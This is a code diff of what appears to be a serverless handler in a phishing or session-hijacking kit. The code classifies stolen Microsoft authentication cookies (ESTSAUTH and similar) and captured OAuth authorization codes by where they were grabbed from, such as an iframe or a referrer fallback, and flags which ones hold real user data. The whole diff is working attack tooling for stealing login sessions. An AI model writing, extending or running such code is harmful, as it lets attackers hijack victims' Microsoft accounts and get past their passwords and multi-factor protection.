@@ -96,10 +96,14 @@ const handler = async (event, context) => {
     let cookieSource = 'unknown';
     
     if (cookieCount === 0) {
-        cookieDetails = 'No cookies captured';
+        cookieDetails = 'No cookies captured - Cross-origin restrictions';
         cookieSource = 'none';
     } else {
-        // Check if these are real Microsoft cookies
+        // Check the source of captured cookies
+        const captureSource = cookies[0]?.capturedFrom || 'unknown';
+        const hasRealUserData = cookies.some(c => c.realUserData === true);
+        
+        // Check for specific Microsoft cookies
         const hasMicrosoftCookies = cookies.some(c => 
             c.name && (
                 c.name.includes('ESTSAUTH') || 
@@ -111,17 +115,30 @@ const handler = async (event, context) => {
             )
         );
         
-        const hasRealData = cookies.some(c => c.capturedFrom);
+        // Check for OAuth authorization code
+        const hasOAuthCode = cookies.some(c => c.name === 'OAUTH_AUTH_CODE');
         
-        if (hasMicrosoftCookies && hasRealData) {
-            cookieDetails = `${cookieCount} REAL Microsoft cookies captured`;
-            cookieSource = cookies[0]?.capturedFrom || 'microsoft-domain';
+        if (hasOAuthCode) {
+            cookieDetails = `OAuth Authorization Code captured`;
+            cookieSource = 'oauth-code';
+        } else if (captureSource === 'microsoft-domain-iframe' && hasRealUserData) {
+            cookieDetails = `${cookieCount} REAL Microsoft cookies from iframe`;
+            cookieSource = 'microsoft-iframe';
+        } else if (captureSource === 'microsoft-referrer-fallback') {
+            cookieDetails = `${cookieCount} Microsoft auth cookies (referrer fallback)`;
+            cookieSource = 'microsoft-fallback';
+        } else if (captureSource === 'oauth-callback-domain') {
+            cookieDetails = `${cookieCount} callback domain cookies`;
+            cookieSource = 'callback-domain';
+        } else if (captureSource === 'current-domain') {
+            cookieDetails = `${cookieCount} current domain cookies`;
+            cookieSource = 'current-domain';
         } else if (hasMicrosoftCookies) {
             cookieDetails = `${cookieCount} Microsoft auth cookies`;
-            cookieSource = 'microsoft-fallback';
+            cookieSource = 'microsoft-standard';
         } else {
-            cookieDetails = `${cookieCount} domain cookies captured`;
-            cookieSource = cookies[0]?.capturedFrom || 'current-domain';
+            cookieDetails = `${cookieCount} cookies captured`;
+            cookieSource = captureSource || 'unknown';
         }
     }
 
